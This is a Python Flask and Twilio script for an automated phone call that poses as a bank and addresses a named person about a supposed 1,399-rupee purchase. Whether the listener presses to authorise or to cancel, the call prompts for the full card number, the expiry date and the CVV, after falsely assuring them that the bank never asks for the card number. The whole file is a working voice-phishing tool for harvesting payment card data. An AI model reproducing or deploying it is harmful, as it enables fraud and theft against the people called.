from flask import Flask, request
from twilio.twiml.voice_response import VoiceResponse, Gather

app = Flask(__name__)


@app.route("/voice", methods=['GET', 'POST'])
def voice():
    resp = VoiceResponse()
    gather = Gather(num_digits=1, action='/gather')
    gather.say('hello  Praveen  this  is  an  automated  call  from  i eh ee ee bank.  This  call  is  regarding  an  purchase  of  one  thousand  three  hundred  and  nintty  ninne  rupees.     if     you     want    to     authorize      this     transaction      press    one     or  .    if  you  haven\'t  made  an   transaction   please   press   two .      Be   advised   no   one   from   bank   will   ask   for   the   sixteen   digit   debit   card   number.')
    resp.append(gather)

    # If the user doesn't select an option, redirect them into a loop
    #resp.redirect('/voice')

    return str(resp)


@app.route('/gather', methods=['GET', 'POST'])
def gather():
    resp = VoiceResponse()
    if 'Digits' in request.values:
        choice = request.values['Digits']
        if choice == '1':
            resp.say('To confirm your order please confirm your credit card number followed by an hash     after the beep')
            resp.play('https://www.soundjay.com/button/sounds/beep-01a.mp3')
            gather1 = Gather(action='/cc',method='GET')
            resp.append(gather1)
        elif choice == '2':
            resp.say('To Cancel yout order please enter your 16 digit credit card number followed by an hash      after the beep')
            resp.play('https://www.soundjay.com/button/sounds/beep-01a.mp3')
            gather1 = Gather(action='/cd',method='GET')
            resp.append(gather1)
            return str(resp)
        else:
            resp.say("Sorry, I don't understand that choice.")
            resp.redirect('/voice')

    return str(resp)

@app.route('/cc',methods=['GET','POST'])
def cc():
    resp = VoiceResponse()
    resp.say('Please Enter your card expiry details in month and year format  followed by an hash')
    gather2 = Gather(action='/cvc',method='GET')
    resp.append(gather2)
    return str(resp)

@app.route('/cd',methods=['GET','POST'])
def cd():
    resp = VoiceResponse()
    resp.say('Please Enter your card expiry details in month and year format followed by an hash')
    gather2 = Gather(action='/cvd',method='GET')
    resp.append(gather2)
    return str(resp)

@app.route('/cvc',methods=['GET','POST'])
def cvc():
    resp = VoiceResponse()
    resp.say('Please enter your cvv number for a final check, followed by an hash')
    gather3 = Gather(action='/thanks1',method='GET')
    resp.append(gather3)
    return str(resp)

@app.route('/cvd',methods=['GET','POST'])
def cvd():
    resp = VoiceResponse()
    resp.say('Please enter your cvv number for a final check, followed by an hash')
    gather3 = Gather(action='/thanks2',method='GET')
    resp.append(gather3)
    return str(resp)

@app.route('/thanks1',methods=['GET','POST'])
def thanks1():
    resp = VoiceResponse()
    resp.say('Thank You for confirming the transaction.   Your request will be processed soon')
    return str(resp)

@app.route('/thanks2',methods=['GET','POST'])
def thanks2():
    resp = VoiceResponse()
    resp.say('Thank You for cancelling the transaction.   Your request will be processed soon and someone from the bank will be contacting you back for securing your account.')
    return str(resp)

if __name__ == "__main__":
    app.run(port=9001)
